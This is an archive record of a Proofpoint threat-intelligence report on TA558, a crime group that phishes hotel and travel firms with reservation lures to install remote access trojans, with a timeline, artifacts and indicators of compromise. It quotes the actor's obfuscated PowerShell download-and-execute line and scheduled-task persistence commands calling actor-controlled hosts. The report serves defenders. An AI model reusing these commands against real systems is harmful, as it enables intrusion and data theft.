{
    "id": "bc4e21ae-813a-466d-9356-ca19dfb63287",
    "created_at": "2023-01-12T15:02:31.092221Z",
    "updated_at": "2025-03-27T02:17:00.116157Z",
    "deleted_at": null,
    "sha1_hash": "a7de7e4cd4e8205f5c8337a7e309ae9e8062a86a",
    "title": "2022-08-18 - Reservations Requested- TA558 Targets Hospitality and Travel",
    "authors": "",
    "file_creation_date": "2022-09-01T10:11:15Z",
    "file_modification_date": "2022-09-01T10:11:15Z",
    "file_size": 1114196,
    "plain_text": "# Reservations Requested: TA558 Targets Hospitality and Travel\n\n**[proofpoint.com/us/blog/threat-insight/reservations-requested-ta558-targets-hospitality-and-travel](https://www.proofpoint.com/us/blog/threat-insight/reservations-requested-ta558-targets-hospitality-and-travel)**\n\nAugust 16, 2022\n\n## Key Findings:\n\nTA558 is a likely financially motivated small crime threat actor targeting hospitality,\nhotel, and travel organizations.\nSince 2018, this group has used consistent tactics, techniques, and procedures to\nattempt to install a variety of malware including Loda RAT, Vjw0rm, and Revenge RAT.\n\n\n-----\n\nTA558 s targeting focus is mainly on Portuguese and Spanish speakers, typically\nlocated in the Latin America region, with additional targeting observed in Western\nEurope and North America.\nTA558 increased operational tempo in 2022 to a higher average than previously\nobserved.\nLike other threat actors in 2022, TA558 pivoted away from using macro-enabled\ndocuments in campaigns and adopted new tactics, techniques, and procedures.\n\n## Overview\n\nSince 2018, Proofpoint has tracked a financially-motivated cybercrime actor, TA558,\ntargeting hospitality, travel, and related industries located in Latin America and sometimes\nNorth America, and western Europe. The actor sends malicious emails written in\nPortuguese, Spanish, and sometimes English. The emails use reservation-themed lures with\nbusiness-relevant themes such as hotel room bookings. The emails may contain malicious\nattachments or URLs aiming to distribute one of at least 15 different malware payloads,\ntypically remote access trojans (RATs), that can enable reconnaissance, data theft, and\ndistribution of follow-on payloads.\n\nProofpoint tracked this actor based on a variety of email artifacts, delivery and installation\ntechniques, command and control (C2) infrastructure, payload domains, and other\ninfrastructure.\n\nIn 2022, Proofpoint observed an increase in activity compared to previous years.\nAdditionally, TA558 shifted tactics and began using URLs and container files to distribute\nmalware, likely in response to Microsoft announcing it would begin blocking VBA macros\ndownloaded from the internet by default.\n\n[TA558 has some overlap with activity reported by Palo Alto Networks in 2018, Cisco Talos in](https://unit42.paloaltonetworks.com/operation-comando-or-how-to-run-a-cheap-and-effective-credit-card-business/)\n2020 and [2021,](https://blog.talosintelligence.com/2021/08/rat-campaign-targets-latin-america.html) [Uptycs in 2020, and HP](https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america) [in 2022. This report is the first comprehensive,](https://threatresearch.ext.hp.com/stealthy-opendocument-malware-targets-latin-american-hotels/)\npublic report on TA558, detailing activity conducted over four years that is still ongoing. The\ninformation used in the creation of this report is based on email campaigns, which are\nmanually contextualized, and analyst enriched descriptions of automatically condemned\nthreats.\n\n## Campaign Details and Activity Timeline\n\n**2018**\n\nProofpoint first observed TA558 in April 2018. These early campaigns typically used\nmalicious Word attachments that exploited Equation Editor vulnerabilities (e.g. CVE-201711882) or remote template URLs to download and install malware. Two of the most common\n\n\n-----\n\nmalware payloads included Loda and Revenge RAT. Campaigns were conducted exclusively\nin Spanish and Portuguese and targeted the hospitality and related industries, with “reserva”\n(Portuguese word for “reservation”) themes. Example campaign:\n\nSubject: Corrigir data da reserva para o dia 03\n\nAttachment: Booking - Dados da Reserva.docx\n\nAttachment “Author”: C.D.T Original\n\nSHA256: 796c02729c9cd5d37976ddae205226e6339b64859e9980d56cbfc5f461d00910\n\n_Figure 1: Example TA558 email from 2018_\n\n\n-----\n\nThe documents leveraged remote template URLs to download an additional RTF document,\nwhich then downloaded and installed Revenge RAT. Interestingly, the term “CDT\" is in the\ndocument metadata and in the URL. This term, which may refer to a travel organization,\nappears throughout TA558 campaigns from 2018 to present.\n\nRTF payload URL example:\n```\nhxxp[://]cdtmaster[.]com[.]br/DadosDaReserva[.]doc\n\n```\n**2019**\n\nIn 2019, this actor continued to leverage emails with Word documents that exploited\nEquation Editor vulnerabilities (e.g. CVE-2017-11882) to download and install malware.\nTA558 also began using macro-laden PowerPoint attachments and template injection with\nOffice documents. This group expanded their malware arsenal to include Loda, vjw0rm,\nRevenge RAT, and others. In 2019, the group began occasionally expanding targeting\noutside of the hospitality and tourism verticals to include business services and\nmanufacturing. Example campaign:\n\nSubject: RESERVA\n\nAttachment: RESERVA.docx\n\nAttachment “Author”: msword\n\nAttachment “Last Saved By”: Richard\n\nSHA256: 7dc70d023b2ee5a941edd925999bb6864343b11758c7dc18309416f2947ddb6e\n\n\n-----\n\n_Figure 2: Example TA558 email from 2019_\n\n_Figure 3: Example TA558 Microsoft Word attachment from 2019_\n\nThe documents leveraged a remote template relationship URL to download an additional\nRTF document. The RTF document (Author: obidah qudah, Operator: Richard) exploited the\nCVE-2017-11882 vulnerability to retrieve and execute an MSI file. Upon execution, the MSI\nfile extracted and ran Loda malware.\n\nIn December 2019, Proofpoint analysts observed TA558 begin to send English-language\nlures relating to room bookings in addition to Portuguese and Spanish.\n\n**2020**\n\nIn 2020, TA558 stopped using Equation Editor exploits and began distributing malicious\nOffice documents with macros, typically VBA macros, to download and install malware. This\ngroup continued to use a variety of malware payloads including the addition of njRAT and\nOzone RAT.\n\nHotel, hospitality, and travel organization targeting continued. Although the actor slightly\nincreased its English-language operational tempo throughout 2020, most of the lures\nfeatured Portuguese and Spanish reservation requests. An example of a common attack\nchain in 2020:\n\nFrom: Oab Brasil <fernando1540@bol[.]com[.]br>\n\n\n-----\n\nSubject: Orçamento Conferencistas - 515449939\n\nAttachment: reserva.ppa\n\nSHA256: c2b817b02e56624c8ed7944e76a3896556dc2b7482f747f4be88f95e232f9207\n\n_Figure 4: Example TA558 email from 2020_\n\nThe message contained a PowerPoint attachment that used template injection techniques\nand VBA macros which, if enabled, executed a PowerShell script to download a VBS\npayload from an actor-controlled domain. The VBS script in turn downloaded and executed\nRevenge RAT.\n\n_Figure 5: 2020 attack path example_\n\n\n-----\n\nTA558 was more active in 2020 than previous years and 2021, with 74 campaigns\nidentified. 2018, 2019, and 2021 had 9, 70, and 18 total campaigns, respectively. So far in\n2022, Proofpoint analysts have observed 51 TA558 campaigns.\n\n_Figure 6: Total number of TA558 campaigns over time_\n\n**2021**\n\nIn 2021, this actor continued to leverage emails with Office documents containing macros or\nOffice exploits (e.g. CVE-2017-8570) to download and install malware. Its most consistently\nused malware payloads included vjw0rm, njRAT, Revenge RAT, Loda, and AsyncRAT.\n\nAdditionally, this group started to include more elaborate attack chains in 2021. For example,\nintroducing more helper scripts and delivery mechanisms such as embedded Office\ndocuments within MSG files.\n\nIn this example 2021 campaign, emails purported to be, e.g.:\n\nFrom: Financeiro UNIMED <financeiro@unimed-corporated[.]com>\n\nSubject: Reserva\n\nReplyto: cdt[name]cdt@gmail[.]com\n\nAttachment: OficioCircularencaminhadoaoSetorFinanceiroUNIMED.docx\n\nSHA256: 2f0f99cbac828092c0ec23e12ecb44cbf53f5a671a80842a2447e6114e4f6979\n\n\n-----\n\nEmails masqueraded as Unimed, a Brazilian medical work cooperative and health insurance\noperator. These messages contained Microsoft Word attachments with macros which, if\nenabled, invoked a series of scripts to ultimately download and execute AsyncRAT.\n\n_Figure 7: Example TA558 email from 2021_\n\nOf note is the repeat use of the string “CDT” contained the replyto email address and C2\ndomain names.\n\nAsyncRAT C2 domains:\n\nwarzonecdt[.]duckdns[.]org\n\ncdt2021.zapto[.]org\n\nExample PowerShell execution to download and execute AsyncRAT:\n\n$NOTHING = '(Ne<^^>t.We'.Replace('<^^>','w-Object\n\nNe');$alosh='bC||||||!@!@nlo'.Replace('||||||!@!@','lient).Dow');\n$Dont='adString(''hxxps[:]//brasilnativopousada[.]com[.]br/Final.txt'')\n\n';$YOUTUBE=IEX ($NOTHING,$alosh,$Dont -Join '')|IEX\n\nPersistence was achieved through a scheduled task masquerading as a Spotify service.\n```\nschtasks /create /sc MINUTE /mo 1 0 /tn \"Spotfy\" /tr\n\n \"\\\"%windir%\\system32\\mshta.exe\\\"hxxps[:]//www[.]unimed\ncorporated[ ]com/microsoft txt\" /F\n\n```\n\n-----\n\nThis was the actor s least active year. Proofpoint observed just 18 campaigns conducted by\nTA558 in 2021.\n\n**2022**\n\nIn 2022, campaign tempo increased significantly. Campaigns delivered a mixture of malware\nsuch as, Loda, Revenge RAT, and AsyncRAT. This actor used a variety of delivery\nmechanisms including URLs, RAR attachments, ISO attachments, and Office documents.\n\nTA558 followed the trend of many threat actors in 2022 and began using container files such\nas RAR and ISO attachments instead of macro-enabled Office documents. This is likely due\nto Microsoft’s announcements in late 2021 and early 2022 about disabling macros by default\nin Office products, which caused a shift across the threat landscape of actors adopting new\nfiletypes to deliver payloads.\n\nAdditionally, TA558 began using URLs more frequently in 2022. TA558 conducted 27\ncampaigns with URLs in 2022, compared to just five campaigns total from 2018 through\n2021. Typically, URLs led to container files such as ISOs or zip files containing executables.\n\n_Figure 8: Campaigns using specific threat types over time_\n\nFor example, this 2022 Spanish language campaign featured URLs leading to container files.\nMessages purported to be, e.g.:\n\n\n-----\n\nFrom: Mauricio Fortunato <contato@155hotel[.]com[.]br>\n\nSubject: Enc: Reserva Familiar\n\nThe URL purported to be a legitimate 155 Hotel reservation link that led to an ISO file and an\nembedded batch file. The execution of the BAT file led to a PowerShell helper script that\ndownloaded a follow-on payload, AsyncRAT.\n\nSimilar to earlier campaigns, persistence was achieved via a scheduled task:\n```\nschtasks /create /sc MINUTE /mo 1 /tn Turismo /F /tr\n\n\"powershell -w h -NoProfile -ExecutionPolicy Bypass \nCommand start-sleep -s 20;iwr \"\"\\\"\"hxxps[:]//unimed\ncorporated[.]com/tur/turismo[.]jpg\"\"\\\"\" -useB|iex;\"\n\n```\n_Figure 9: 2022 campaign example chain._\n\nIn April 2022 Proofpoint researchers spotted a divergence from the typical email lure. One of\nthe campaigns included a QuickBooks invoice email lure. Additionally, this campaign\nincluded the distribution of RevengeRAT which had not been observed in use by TA558\nsince December 2020. Messages purported to be:\n\nFrom: Intuit QuickBooks Team <quickbooks@unimed-corporated.com>\n\nSubject: QuickBooks Invoice 1000172347\n\nAttachment: 1000172347.xlsm\n\nSHA256: b57a9f7321216c3410ebcc9d4b09e73a652dee9e750f96b2f6d7d1e39e2923d6\n\nThe emails contained Excel attachments with macros that downloaded helper scripts via\nPowerShell and MSHTA. The execution of helper scripts ultimately led to the installation of\nRevengeRAT. Proofpoint has not seen this theme since April, and it is unclear why TA558\ntemporarily pivoted away from reservations themes.\n\n## Malware Use\n\n\n-----\n\nSince 2018, TA558 has used at least 15 different malware families, sometimes with\noverlapping command and control (C2) domains. The most frequently observed payloads\ninclude Loda, Vjw0rm, AsyncRAT, and Revenge RAT.\n\n_Figure 10: Number of TA558 campaigns by malware type over time_\n\nTypically, TA558 uses attacker owned and operated infrastructure. However, Proofpoint has\nobserved TA558 leverage compromised hotel websites to host malware payloads, thus\nadding legitimacy to its malware delivery and C2 traffic.\n\n## Language Use\n\n\n-----\n\nSince Proofpoint began tracking TA558 through 2022, over 90% of campaigns were\nconducted in Portuguese or Spanish, with four percent featuring multiple language lure\nsamples in English, Spanish, or Portuguese.\n\n_Figure 11: Campaign totals by language since 2018_\n\nInterestingly, the threat actor often switches languages in the same week. Proofpoint\nresearchers have observed this actor send, for example, a campaign in English and the\nfollowing day another campaign in Portuguese. Individual targeting typically differs based on\ncampaign language.\n\n## Notable Campaign Artifacts\n\nIn addition to the consistent lure themes, targeting, message content, and malware payloads,\nProofpoint researchers observed TA558 using multiple notable patterns in campaign data\nincluding the use of certain strings, naming conventions and keywords, domains, etc. For\nexample, the actor appears to repeat the term CDT in email and malware attributes. This\nmay relate to the [CDT Travel organization and related travel reservation lure themes.](https://www.cdttravel.com/)\nProofpoint researchers observed TA558 use the CDT term in dozens of campaigns since\n2018, in C2 domains, replyto email addresses, payload URLs, scheduled task name, and\nMicrosoft Office document metadata (i.e., Author, Last Saved By), and Microsoft Office\nmacro language.\n\nThroughout many of the 2019 and 2020 campaigns the threat actor used various URLs from\nthe domain sslblindado[.]com to download either helper scripts or malware payloads. Some\nexamples include:\n\n\n-----\n\nmicrosofft[.]sslblindado[.]com\npassagensv[.]sslblindado[.]com\nsystem11[.]sslblindado[.]com\n\nLike other threat actors, this group sometimes mimics technology service names to appear\nlegitimate. For example, using terms in payload URLs or C2 domain names. Some examples\ninclude:\n\nmicrosofft[.]sslblindado[.]com\nfirefoxsystem[.]sytes[.]net\ngoogledrives[.]ddns[.]net\n\nAnother interesting pattern observed were common strings like “success” and “pitbull”. In\nseveral campaigns Proofpoint researchers spotted these strings in C2 domains. Some\nexamples include:\n\nsuccessfully[.]hopto[.]org\nsuccess20[.]hopto[.]org\n4success[.]zapto[.]org\n\nFrom 2019 through 2020, TA558 conducted 10 campaigns used the keyword “Maringa” or\n“Maaringa” in payload URLs or email senders. Maringa is a city in Brazil. Examples include:\n\nmaringareservas[.]com[.]br/seila[.]rtf\nmaringa[.]turismo@system11[.]com[.]br\n\n## Possible Objectives\n\nProofpoint has not observed post-compromise activity from TA558. Based on the observed\npayloads, victimology, and campaign and message volume, Proofpoint assesses with\nmedium to high confidence that this is a financially motivated cybercriminal actor.\n\nThe malware used by TA558 can steal data including hotel customer user and credit card\ndata, allow lateral movement, and deliver follow-on payloads.\n\nOpen-source reporting provides insight into one possible threat actor objective. In July, CNN\nPortugal [reported a Portuguese hotel’s website was compromised, and the actor was able to](https://cnnportugal.iol.pt/videos/atraves-da-conta-do-booking-de-hotel-de-lisboa-hacker-so-precisou-de-quatro-dias-para-lucrar-500-mil-euros/62c5de7f0cf26256cd2c4c73?utm_source=substack&utm_medium=email)\nmodify the website and direct customers to a fake reservation page. The actor stole funds\nfrom potential customers by posing as the compromised hotel. Although Proofpoint does not\nassociate the identified activity with TA558, it provides an example of possible follow-on\nactivity and the impacts to both target organizations and their customers if an actor is able to\ncompromise hotel or transportation entities.\n\n## Conclusion\n\n\n-----\n\nTA558 is an active threat actor targeting hospitality, travel, and related industries since 2018.\nActivity conducted by this actor could lead to data theft of both corporate and customer data,\nas well as potential financial losses.\n\nOrganizations, especially those operating in targeted sectors in Latin America, North\nAmerica, and Western Europe should be aware of this actor’s tactics, techniques, and\nprocedures.\n\n## Indicators of Compromise (IOCs) \n\nThe following IOCs represent a sample of indicators observed by Proofpoint researchers\nassociated with TA558.\n\n**C2 Domains**\n\n**Indicator** **Description** **Date Observed**\n\nquedabesouro[.]ddns[.]net RevengeRAT C2 Domain 2018\n\nqueda212[.]duckdns[.]org njRAT/RevengeRAT C2 Domain 2018\n\n3030pp[.]hopto[.]org vjw0rm C2 Domain 2018 and 2019\n\nvemvemserver[.]duckdns[.]org Houdini/Loda C2 Domain 2019\n\n4success[.]zapto[.]org Loda C2 Domain 2019\n\nsuccess20[.]hopto[.]org Loda C2 Domain 2020\n\nmsin[.]hopto[.]org Loda C2 Domain 2021 and 2022\n\ncdtpitbull[.]hopto[.]org AsyncRAT C2 Domain 2021 and 2022\n\n111234cdt[.]ddns[.]net njRAT/AsyncRAT C2 Domain 2021 and 2022\n\ncdt2021[.]zapto[.]org AsyncRAT C2 Domain 2021 and 2022\n\n38[.]132[.]101[.]45 RevengRAT C2 IP 2022\n\n\n-----\n\n**Payload URLs**\n\n**Indicator** **Description** **Date**\n**Observed**\n\nhxxp[://]cdtmaster[.]com[.]br/DadosDaReserva[.]doc RTF payload URL 2018\n\nhxxp[://]hypemediardf[.]com[.]pl/css/css[.]doc Loda Payload URL 2019\n\n\nhxxps[:]//brasilnativopousada[.]com[.]br/Final[.]txt AsyncRAT Payload\nURL\n\n\nhxxps[:]//www[.]unimedcorporated[.]com/microsoft[.]txt\n\n\nAsyncRAT Scheduled\nTask URL\n\n\n2021\n\n2021\n\n2022\n\n\nhxxps[:]//unimed-corporated[.]com/tur/turismo[.]jpg AsyncRAT Scheduled\nTask URL\n\n**ET Signatures**\n\nETPRO MALWARE Loda Logger CnC Activity\n\nETPRO TROJAN MSIL/Revenge-RAT Keep-Alive Activity (Outbound)\n\nETPRO TROJAN MSIL/Revenge-RAT CnC Checkin\n\nETPRO TROJAN MSIL/Revenge-RAT CnC Checkin M2\n\nETPRO TROJAN MSIL/Revenge-RAT CnC Checkin M4\n\nETPRO TROJAN njRAT/Bladabindi Variant CnC Activity (inf)\n\nETPRO TROJAN Generic njRAT/Bladabindi CnC Activity (act)\n\nETPRO TROJAN Generic njRAT/Bladabindi CnC Activity (inf)\n\nET TROJAN Bladabindi/njRAT CnC Command (ll)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-18 - Reservations Requested- TA558 Targets Hospitality and Travel.pdf"
    ],
    "report_names": [
        "2022-08-18 - Reservations Requested- TA558 Targets Hospitality and Travel.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "316b23b5-e097-4dc6-8b1c-d096860c6c16",
            "created_at": "2022-10-25T16:07:24.290801Z",
            "updated_at": "2025-03-27T02:02:10.161983Z",
            "deleted_at": null,
            "main_name": "TA558",
            "aliases": [],
            "source_name": "ETDA:TA558",
            "tools": [
                "AZORult",
                "AsyncRAT",
                "Bladabindi",
                "ExtRat",
                "Jorik",
                "Loda",
                "Loda RAT",
                "LodaRAT",
                "Nymeria",
                "PuffStealer",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Rultazo",
                "Socmer",
                "Vengeance Justice Worm",
                "Vjw0rm",
                "Xtreme RAT",
                "XtremeRAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e819f7c1-855b-4834-b30c-493832336ddb",
            "created_at": "2022-10-25T16:07:23.939418Z",
            "updated_at": "2025-03-27T02:02:10.038419Z",
            "deleted_at": null,
            "main_name": "Operation Comando",
            "aliases": [],
            "source_name": "ETDA:Operation Comando",
            "tools": [
                "AsyncRAT",
                "Atros2.CKPN",
                "Bladabindi",
                "CapturaTela",
                "Jorik",
                "LimeRAT",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Socmer",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e1e83b71-854a-4ddf-82ed-141c1d151c3c",
            "created_at": "2023-01-06T13:46:38.934536Z",
            "updated_at": "2025-03-27T02:00:02.955821Z",
            "deleted_at": null,
            "main_name": "Operation Comando",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Comando",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf91b389-9602-45c0-8d6b-c61d14800f54",
            "created_at": "2023-01-06T13:46:39.448277Z",
            "updated_at": "2025-03-27T02:00:03.094815Z",
            "deleted_at": null,
            "main_name": "TA558",
            "aliases": [],
            "source_name": "MISPGALAXY:TA558",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535751,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1662027075,
    "ts_modification_date": 1662027075,
    "files": {
        "pdf": "https://archive.orkl.eu/a7de7e4cd4e8205f5c8337a7e309ae9e8062a86a.pdf",
        "text": "https://archive.orkl.eu/a7de7e4cd4e8205f5c8337a7e309ae9e8062a86a.txt",
        "img": "https://archive.orkl.eu/a7de7e4cd4e8205f5c8337a7e309ae9e8062a86a.jpg"
    }
}